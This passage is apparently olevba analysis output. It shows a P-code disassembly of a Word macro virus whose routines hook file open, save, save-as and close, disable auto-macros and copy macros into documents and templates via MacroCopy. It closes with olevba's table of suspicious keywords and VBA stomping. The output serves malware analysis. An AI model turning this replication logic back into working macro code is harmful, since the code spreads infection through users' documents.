' 	ArgsMemLd [MacroName$] 0x0002 
' 	St B$ 
' Line #123:
' 	Ld B$ 
' 	LitDI2 0x0007 
' 	ArgsLd M__$ 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St K 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St K 
' 	EndIf 
' Line #124:
' 	Ld B$ 
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld B$ 
' 	Add 
' 	Ld K 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #125:
' 	StartForVariable 
' 	Next 
' Line #126:
' 	Ld D_ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Private Sub FO())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #134:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError E 
' Line #135:
' 	Dim 
' 	VarDefn D (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set D 
' Line #136:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #137:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #138:
' 	Ld D 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #139:
' 	Ld D 
' 	MemLd New 
' 	Paren 
' 	ArgsCall S 0x0001 
' Line #140:
' 	Label E 
' Line #141:
' 	EndSub 
' Line #142:
' 	FuncDefn (Private Sub FC())
' Line #143:
' 	OnError (Resume Next) 
' Line #144:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #145:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ArgsCall S 0x0001 
' Line #146:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Private Sub FS())
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #151:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError False 
' Line #152:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #153:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ArgsCall S 0x0001 
' Line #154:
' 	Label False 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Private Sub FSA())
' Line #157:
' 	Dim 
' 	VarDefn T
' Line #158:
' 	Dim 
' 	VarDefn W
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #161:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError G 
' Line #162:
' 	Dim 
' 	VarDefn D (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set D 
' Line #163:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #164:
' 	Ld D 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #165:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #166:
' 	Ld D 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #167:
' 	Ld D 
' 	MemLd New 
' 	Paren 
' 	ArgsCall S 0x0001 
' Line #168:
' 	ElseBlock 
' Line #169:
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	St T 
' Line #170:
' 	Ld D 
' 	MemLd New 
' 	St W$ 
' Line #171:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed Template 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #172:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError H 
' Line #173:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #174:
' 	Ld W$ 
' 	Ld D 
' 	MemSt New 
' Line #175:
' 	Ld D 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #176:
' 	Ld D 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #177:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError G 
' Line #178:
' 	Ld D 
' 	MemLd New 
' 	Paren 
' 	ArgsCall S 0x0001 
' Line #179:
' 	Ld T 
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld T 
' 	LitDI2 0x0001 
' 	Add 
' 	St T 
' 	EndIf 
' Line #180:
' 	Ld T 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' Line #181:
' 	Label H 
' Line #182:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Label G 
' Line #185:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

